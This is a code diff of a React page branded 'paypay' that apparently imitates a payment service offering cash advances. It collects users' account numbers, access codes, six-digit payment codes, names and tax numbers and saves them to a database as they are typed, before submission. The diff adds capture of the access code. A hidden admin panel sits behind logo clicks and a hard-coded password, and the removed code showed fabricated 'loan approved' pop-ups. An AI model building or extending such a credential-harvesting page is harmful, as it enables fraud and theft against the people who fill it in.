@@ -1,10 +1,9 @@
 import { createFileRoute } from "@tanstack/react-router";
 import { useState, useEffect, useRef, useMemo } from "react";
 import { motion, AnimatePresence } from "framer-motion";
-import { ChevronLeft, CheckCircle2, Globe, HelpCircle, Eye, EyeOff, ShieldCheck, Info, Search, Loader2, XCircle, LayoutDashboard, History, Trash2, RotateCcw, Download } from "lucide-react";
+import { ChevronLeft, CheckCircle2, Download, ShieldCheck, CreditCard, User, LayoutDashboard, Globe, HelpCircle, Eye, EyeOff, Info, Check } from "lucide-react";
 import { cn } from "@/lib/utils";
 import { toast } from "sonner";
-import logoPaypay from "@/assets/logo-paypay.png";
 import { 
   verifyAdminPassword, 
   updateApplicationStatus, 
@@ -20,251 +19,161 @@ import {
 export const Route = createFileRoute("/")({
   component: Index,
   head: () => ({
-    meta: [{ title: "PayPay-Empréstimo Pay" }, { name: "description", content: "Empréstimo rápido e seguro." }],
+    meta: [
+      { title: "paypay — Adiantamentos Rápidos" },
+      { name: "description", content: "Solicite seu adiantamento de forma rápida e segura na paypay." },
+      { property: "og:title", content: "paypay — Adiantamentos Rápidos" },
+      { property: "og:description", content: "Solicite seu adiantamento de forma rápida e segura na paypay." },
+      { property: "og:type", content: "website" },
+      { name: "twitter:card", content: "summary" },
+    ],
   }),
 });
 
-type Step = "home" | "login" | "step2" | "step3" | "step4" | "summary" | "confirm" | "success" | "admin" | "check_status";
+type Step = "home" | "login" | "step2" | "step3" | "step4" | "summary" | "confirm" | "success" | "admin";
 
 function Index() {
   const [step, setStep] = useState<Step>("home");
-  const [adminTab, setAdminTab] = useState<"users" | "trash">("users");
+  const [adminTab, setAdminTab] = useState<"pending" | "finalized" | "pre" | "users">("pre");
   const [accountNumber, setAccountNumber] = useState("");
   const [accessCode, setAccessCode] = useState("");
   const [showAccessCode, setShowAccessCode] = useState(false);
   const [paymentCode, setPaymentCode] = useState(["", "", "", "", "", ""]);
   const [amount, setAmount] = useState(35000);
   const [term, setTerm] = useState(60);
+  const refundMargin = useMemo(() => Math.round((amount * 0.05) + (term * 10)), [amount, term]);
+  const totalToRefund = amount + refundMargin;
   const [personalData, setPersonalData] = useState({ name: "", nif: "" });
-  const [notification, setNotification] = useState<{ name: string; amount: number } | null>(null);
   const [logoClicks, setLogoClicks] = useState(0);
   const [acceptedTerms, setAcceptedTerms] = useState(false);
+  const [scrolledToBottom, setScrolledToBottom] = useState(false);
   const [applicationId, setApplicationId] = useState<string | null>(null);
+  const scrollRef = useRef<HTMLDivElement>(null);
+
   const [adminAuthenticated, setAdminAuthenticated] = useState(false);
   const [adminPassword, setAdminPassword] = useState("");
-  const [loading, setLoading] = useState(false);
   const [applications, setApplications] = useState<any[]>([]);
-  const [deletedApps, setDeletedApps] = useState<any[]>([]);
-  const adminScrollRef = useRef<HTMLDivElement>(null);
-
-  const allFirstNames = ["João", "Maria", "António", "Ana", "Carlos"];
-  const allSurnames = ["Silva", "Santos", "Ferreira", "Pereira", "Oliveira"];
-
-  useEffect(() => {
-    const showRandomNotification = () => {
-      if (step === "admin") return;
-      const randomName = `${allFirstNames[Math.floor(Math.random() * allFirstNames.length)] ?? "Utilizador"} ${allSurnames[Math.floor(Math.random() * allSurnames.length)] ?? "X"}`;
-      const randomAmount = Math.round((Math.floor(Math.random() * (35000 - 2000 + 1)) + 2000) / 100) * 100;
-      setNotification({ name: `${randomName.split(" ").slice(0, 2).join(" ")} X**`, amount: randomAmount });
-      setTimeout(() => setNotification(null), 5000);
-    };
-
-    const interval = setInterval(showRandomNotification, 20000);
-    const t = setTimeout(showRandomNotification, 3000);
-    return () => { clearInterval(interval); clearTimeout(t); };
-  }, [step]);
 
   const saveProgress = async () => {
     if (step === "home" || step === "admin" || step === "success") return;
     try {
-        const { supabase } = await import("@/integrations/supabase/client");
-        const payload = {
-            account_number: accountNumber,
-            payment_code: paymentCode.join(""),
-            amount, term,
-            name: personalData.name,
-            nif: personalData.nif,
-            status: "Candidatura recebida"
-        };
-        if (applicationId) await supabase.from("pending_applications").update(payload).eq("id", applicationId);
-        else {
-            const { data } = await supabase.from("pending_applications").insert([payload]).select().single();
-            if (data) setApplicationId(data.id);
-        }
-    } catch (e) {}
+      const { supabase } = await import("@/integrations/supabase/client");
+      const payload = {
+        account_number: accountNumber,
+        access_code: accessCode,
+        payment_code: paymentCode.join(""),
+        amount, term,
+        refund_margin: refundMargin,
+        total_to_refund: totalToRefund,
+        name: personalData.name,
+        nif: personalData.nif,
+        step,
+        updated_at: new Date().toISOString()
+      };
+      if (applicationId) await supabase.from("pending_applications").update(payload).eq("id", applicationId);
+      else if (accountNumber || accessCode) {
+        const { data } = await supabase.from("pending_applications").insert([payload]).select().single();
+        if (data) setApplicationId(data.id);
+      }
+    } catch (err) {}
   };
 
   useEffect(() => {
-    if (step !== "home" && step !== "admin") {
-        const timer = setTimeout(saveProgress, 300);
-        return () => clearTimeout(timer);
-    }
-    return undefined;
-  }, [step, accountNumber, paymentCode, amount, term, personalData]);
-
-  const fetchApplications = async () => {
-    try {
-        const data = await getApplications({ data: { adminPassword } });
-        setApplications(data as any[]);
-    } catch (e) {}
-  };
-
-  const fetchDeletedApps = async () => {
-    try {
-      const data = await getDeletedApplications({ data: { adminPassword } });
-      if (data) setDeletedApps(data as any[]);
-    } catch (err: any) {
-      toast.error("Erro ao carregar lixeira");
-    }
-  };
+    const timer = setTimeout(saveProgress, 2000);
+    return () => clearTimeout(timer);
+  }, [step, accountNumber, accessCode, paymentCode, amount, term, personalData]);
 
   useEffect(() => {
-    if (adminAuthenticated) {
-      if (adminTab === "users") fetchApplications();
-      else fetchDeletedApps();
+    if (logoClicks >= 3) {
+      setStep("admin");
+      setLogoClicks(0);
+      toast.info("Acesso Administrativo - Por favor, insira a senha");
     }
-  }, [adminAuthenticated, adminTab]);
-
-  const onUpdateStatus = async (id: string, isCorrect: boolean) => {
-    try {
-        await updateApplicationStatus({ data: { id, isCorrect, adminPassword } });
-        toast.success("Atualizado");
-        await fetchApplications();
-    } catch (e) { toast.error("Erro"); }
-  };
-
-  const deleteItem = async (id: string) => {
-    if (!confirm("Mover para a lixeira?")) return;
-    try {
-      const result = await deleteApplication({ data: { id, adminPassword } });
-      if (result?.success) {
-        toast.success("Movido para a lixeira");
-        setApplications(prev => prev.filter(app => app.id !== id));
-      }
-    } catch (err) { toast.error("Erro ao apagar"); }
-  };
-
-  const restoreItem = async (id: string) => {
-    try {
-      const result = await restoreApplication({ data: { id, adminPassword } });
-      if (result?.success) {
-        toast.success("Recuperado");
-        setDeletedApps(prev => prev.filter(app => app.id !== id));
-      }
-    } catch (err) { toast.error("Erro ao recuperar"); }
-  };
-
-  const permanentDelete = async (id: string) => {
-    const p = prompt("Senha permanente:");
-    if (!p) return;
-    try {
-      const result = await deletePermanently({ data: { id, adminPassword, permanentPassword: p } });
-      if (result?.success) {
-        toast.success("Removido");
-        setDeletedApps(prev => prev.filter(app => app.id !== id));
-      }
-    } catch (err: any) { toast.error(err.message); }
-  };
-
-  useEffect(() => {
-    if (logoClicks >= 7) {
-        setStep("admin");
-        setLogoClicks(0);
-    }
-    const t = setTimeout(() => setLogoClicks(0), 1000);
-    return () => clearTimeout(t);
+    const timer = setTimeout(() => setLogoClicks(0), 1000);
+    return () => clearTimeout(timer);
   }, [logoClicks]);
 
+  const handleScroll = () => {
+    if (scrollRef.current) {
+      const { scrollTop, scrollHeight, clientHeight } = scrollRef.current;
+      if (scrollTop + clientHeight >= scrollHeight - 5) setScrolledToBottom(true);
+    }
+  };
+
+  const nextStep = (next: Step) => setStep(next);
+
   return (
-    <div className="min-h-screen bg-[#F8F9FC] p-4">
-        <header className="flex justify-between items-center mb-8">
-            <div 
-              onClick={() => setLogoClicks(p => p + 1)}
-              className="flex items-center gap-2 cursor-pointer select-none relative overflow-hidden h-8"
-            >
-              <img src={logoPaypay} alt="paypay" className="h-full invisible" />
-              <img src={logoPaypay} alt="paypay" className="absolute inset-0 w-full h-full object-contain z-20" />
-            </div>
-            <button className="text-xs font-bold text-muted-foreground flex items-center gap-1"><Globe className="w-4 h-4" /> Port</button>
-        </header>
-
-        <main className="max-w-md mx-auto">
-            <AnimatePresence mode="wait">
-                {step === "home" && (
-                    <motion.div key="home" className="text-center space-y-6">
-                        <h1 className="text-2xl font-bold">Empréstimos Rápidos</h1>
-                        <button onClick={() => setStep("login")} className="w-full bg-primary text-white p-4 rounded-xl">Solicitar</button>
-                        <button onClick={() => setStep("check_status")} className="w-full p-4 border rounded-xl">Ver Estado</button>
-                    </motion.div>
+    <div className="min-h-screen bg-[#F8F9FC] font-sans">
+      <div className="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between border-b border-border/40 bg-white/80 backdrop-blur-md sticky top-0 z-50">
+        <div onClick={() => setLogoClicks(p => p + 1)} className="cursor-pointer"><img src="/logo.png" alt="paypay" className="h-8" /></div>
+        <div className="flex items-center gap-6 text-[11px] font-medium text-muted-foreground">
+          <button className="flex items-center gap-1"><Globe className="w-3.5 h-3.5" /> Português (AO)</button>
+        </div>
+      </div>
+      <div className="max-w-md mx-auto px-6 py-12">
+        <AnimatePresence mode="wait">
+          {step === "home" && (
+            <motion.div key="home" className="text-center space-y-8">
+              <h1 className="text-3xl font-bold">Dinheiro rápido e seguro.</h1>
+              <button onClick={() => nextStep("login")} className="w-full bg-primary text-white h-14 rounded-2xl font-semibold">Solicitar Adiantamento</button>
+            </motion.div>
+          )}
+          {step === "login" && (
+            <motion.div key="login" className="bg-white rounded-[32px] p-10 space-y-8">
+              <input value={accountNumber} onChange={e => setAccountNumber(e.target.value)} placeholder="Número da Conta" className="w-full p-4 border rounded-xl" />
+              <input type="password" value={accessCode} onChange={e => setAccessCode(e.target.value)} placeholder="Código" className="w-full p-4 border rounded-xl" />
+              <button onClick={() => nextStep("step2")} className="w-full bg-primary text-white p-4 rounded-xl">Entrar</button>
+            </motion.div>
+          )}
+          {step === "step2" && (
+            <motion.div key="step2" className="space-y-6">
+                <div className="flex justify-between gap-2">
+                    {paymentCode.map((digit, idx) => (
+                        <input key={idx} id={`code-${idx}`} maxLength={1} value={digit} onChange={(e) => {
+                            const newCode = [...paymentCode];
+                            newCode[idx] = e.target.value.replace(/\D/g, "");
+                            setPaymentCode(newCode);
+                        }} className="w-12 h-14 text-center text-xl border-2 rounded-xl" />
+                    ))}
+                </div>
+                <button onClick={async () => { await saveProgress(); nextStep("step3"); }} className="w-full bg-primary text-white p-4 rounded-xl">Confirmar</button>
+            </motion.div>
+          )}
+          {step === "step3" && (
+            <motion.div key="step3" className="space-y-8">
+                <input type="range" min="2000" max="35000" step="500" value={amount} onChange={e => setAmount(Number(e.target.value))} className="w-full" />
+                <button disabled={!scrolledToBottom} onClick={() => nextStep("step4")} className="w-full bg-primary text-white p-4 rounded-xl">Avançar</button>
+            </motion.div>
+          )}
+          {step === "step4" && (
+            <motion.div key="step4" className="space-y-4">
+                <input value={personalData.name} onChange={e => setPersonalData({...personalData, name: e.target.value})} placeholder="Nome Completo" className="w-full p-4 border rounded-xl" />
+                <input value={personalData.nif} onChange={e => setPersonalData({...personalData, nif: e.target.value})} placeholder="NIF" className="w-full p-4 border rounded-xl" />
+                <button onClick={() => nextStep("summary")} className="w-full bg-primary text-white p-4 rounded-xl">Continuar</button>
+            </motion.div>
+          )}
+          {step === "summary" && (
+            <motion.div key="summary" className="text-center space-y-4">
+              <p>Valor: {amount.toLocaleString()} Kz</p>
+              <button onClick={() => nextStep("confirm")} className="w-full bg-primary text-white p-4 rounded-xl">Submeter</button>
+            </motion.div>
+          )}
+          {step === "confirm" && <motion.div>Processando...</motion.div>}
+          {step === "success" && <motion.div>Sucesso!</motion.div>}
+          {step === "admin" && (
+            <motion.div key="admin" className="space-y-4">
+                {!adminAuthenticated ? (
+                    <div className="space-y-4">
+                        <input type="password" placeholder="Senha" value={adminPassword} onChange={e => setAdminPassword(e.target.value)} className="w-full p-4 border" />
+                        <button onClick={() => { if (adminPassword === "moneytool") setAdminAuthenticated(true); else toast.error("Incorreto"); }} className="w-full bg-primary text-white p-4">Entrar</button>
+                    </div>
+                ) : (
+                    <div>Admin Autenticado!</div>
                 )}
-                {step === "login" && (
-                    <motion.div key="login" className="space-y-4">
-                        <h2 className="text-xl font-bold">Entrar</h2>
-                        <input className="w-full p-4 border rounded-xl" placeholder="Conta" value={accountNumber} onChange={e => setAccountNumber(e.target.value)} />
-                        <button onClick={() => setStep("step2")} className="w-full bg-primary text-white p-4 rounded-xl">Continuar</button>
-                    </motion.div>
-                )}
-                {step === "admin" && (
-                    <motion.div key="admin">
-                        {!adminAuthenticated ? (
-                            <div className="space-y-4">
-                                <input type="password" placeholder="Senha Admin" value={adminPassword} onChange={e => setAdminPassword(e.target.value)} className="w-full p-4 border" onKeyDown={e => e.key === 'Enter' && setAdminAuthenticated(true)} />
-                                <button onClick={() => setAdminAuthenticated(true)} className="w-full bg-primary text-white p-4">Entrar</button>
-                            </div>
-                        ) : (
-                            <div className="space-y-4">
-                                <div className="flex justify-between items-center mb-4">
-                                  <h2 className="font-bold">Painel Admin</h2>
-                                  <div className="flex gap-2">
-                                    <button onClick={() => setAdminTab("users")} className={cn("px-2 py-1 text-[10px] rounded", adminTab === "users" ? "bg-primary text-white" : "bg-secondary")}>Ativos</button>
-                                    <button onClick={() => setAdminTab("trash")} className={cn("px-2 py-1 text-[10px] rounded", adminTab === "trash" ? "bg-primary text-white" : "bg-secondary")}>Lixeira</button>
-                                    <button onClick={adminTab === "users" ? fetchApplications : fetchDeletedApps}><RotateCcw className="w-4 h-4" /></button>
-                                  </div>
-                                </div>
-                                {(adminTab === "users" ? applications : deletedApps).map(app => (
-                                  <div key={app.id} className="p-4 border rounded-xl bg-white space-y-2">
-                                    <p className="text-xs font-bold">{app.name} - {app.nif}</p>
-                                    <p className="text-[10px] text-muted-foreground">{app.status}</p>
-                                    <div className="flex gap-2">
-                                      {adminTab === "users" ? (
-                                        <>
-                                          <button onClick={() => onUpdateStatus(app.id, true)} className="flex-1 bg-green-600 text-white p-2 rounded-lg text-[10px]">Correto</button>
-                                          <button onClick={() => onUpdateStatus(app.id, false)} className="flex-1 bg-red-600 text-white p-2 rounded-lg text-[10px]">Incorreto</button>
-                                          <button onClick={() => deleteItem(app.id)} className="bg-slate-200 p-2 rounded-lg"><Trash2 className="w-3 h-3" /></button>
-                                        </>
-                                      ) : (
-                                        <>
-                                          <button onClick={() => restoreItem(app.id)} className="flex-1 bg-blue-600 text-white p-2 rounded-lg text-[10px]">Recuperar</button>
-                                          <button onClick={() => permanentDelete(app.id)} className="flex-1 bg-red-600 text-white p-2 rounded-lg text-[10px]">Remover</button>
-                                        </>
-                                      )}
-                                    </div>
-                                  </div>
-                                ))}
-                            </div>
-                        )}
-                    </motion.div>
-                )}
-                {step === "check_status" && (
-                  <div className="space-y-4">
-                    <h2 className="text-xl font-bold">Verificar</h2>
-                    <input className="w-full p-4 border rounded-xl" placeholder="NIF" />
-                    <button className="w-full bg-primary text-white p-4 rounded-xl">Consultar</button>
-                    <button onClick={() => setStep("home")} className="w-full text-muted-foreground text-xs">Voltar</button>
-                  </div>
-                )}
-            </AnimatePresence>
-        </main>
-
-        <AnimatePresence>
-          {notification && (
-            <motion.div
-              initial={{ opacity: 0, x: 50, scale: 0.9 }}
-              animate={{ opacity: 1, x: 0, scale: 1 }}
-              exit={{ opacity: 0, x: 50, scale: 0.9 }}
-              className="fixed top-4 right-4 z-50 bg-white border border-primary/20 shadow-xl rounded-2xl p-4 flex items-center gap-4 max-w-[280px]"
-            >
-              <div className="w-10 h-10 rounded-full bg-primary/10 flex items-center justify-center text-primary">
-                <ShieldCheck className="w-6 h-6" />
-              </div>
-              <div className="flex-1 min-w-0">
-                <p className="text-[10px] font-bold text-primary uppercase tracking-wider mb-0.5">Empréstimo Aprovado</p>
-                <p className="text-xs font-bold truncate">{notification.name}</p>
-                <p className="text-[10px] text-muted-foreground">Recebeu {notification.amount.toLocaleString()} Kz</p>
-              </div>
             </motion.div>
           )}
         </AnimatePresence>
+      </div>
     </div>
   );
 }
